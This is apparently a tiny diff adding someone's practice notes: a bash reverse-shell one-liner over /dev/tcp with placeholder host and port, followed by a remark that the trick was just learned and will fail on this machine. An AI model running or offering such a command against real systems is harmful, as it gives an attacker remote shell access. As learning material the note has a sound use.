@@ -1,0 +1,3 @@
+bash -i >& /dev/tcp/victim_ip/port 0>&1
+
+this trick i learned now but this one will fail in this machine
